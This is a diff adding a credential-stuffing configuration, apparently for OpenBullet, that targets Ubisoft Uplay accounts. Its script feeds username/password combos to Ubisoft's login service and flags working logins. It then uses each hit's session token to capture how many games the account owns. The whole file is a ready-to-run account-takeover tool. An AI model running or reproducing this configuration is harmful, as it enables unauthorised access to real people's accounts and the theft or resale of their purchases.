@@ -1,0 +1,92 @@
+[SETTINGS]
+{
+  "Name": "Uplay PROXYLESS",
+  "SuggestedBots": 10,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-05T20:26:04.2786302+03:30",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "http://signupservice.ubi.com/PublicSignupService.svc" AutoRedirect=FALSE 
+  CONTENT "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns=\"http://publicservice.ubi.com/publicservice/2011/05\"> <soapenv:Header/> <soapenv:Body>  <ns:LogIn>   <ns:genomeId>c72aa68b-ba70-4f4f-83c9-e0cc7728ac19</ns:genomeId>   <ns:userName><USER></ns:userName>   <ns:password><PASS></ns:password>  </ns:LogIn> </soapenv:Body></soapenv:Envelope>" 
+  CONTENTTYPE "text/xml;charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Ubi-RequestedPlatformType: uplay" 
+  HEADER "SOAPAction: http://publicservice.ubi.com/publicservice/2011/05/IPublicSignupService/LogIn" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "</a:AccountName>" 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "</a:AccountName>" 
+
+FUNCTION Base64Encode "<USER>:<PASS>" -> VAR "auth" 
+
+REQUEST POST "https://connect.ubi.com/ubiservices/v2/profiles/sessions" 
+  CONTENT "{}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Ubi-RequestedPlatformType: uplay" 
+  HEADER "Ubi-AppId: 805319f5-950b-4490-9b3f-4e420df5084a" 
+  HEADER "Authorization: Basic <auth>" 
+
+PARSE "<SOURCE>" LR "userId\":\"" "\",\"username" -> VAR "profileid" 
+
+PARSE "<SOURCE>" LR "{\"token\":\"" "\",\"ticket" -> VAR "token" 
+
+REQUEST GET "https://wspuplay-ext.ubi.com/UplayServices/WinServices/GameClientServices.svc/REST/JSON/GetGamePlatformsByUserId/<profileid>/en-US/?onlyOwned=true&rowsCount=-1&pCodeIssuer=PC&country=EN" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Token: <token>" 
+
+PARSE "<SOURCE>" LR "TotalCount\":" "}" -> CAP "Total Games" 
+  
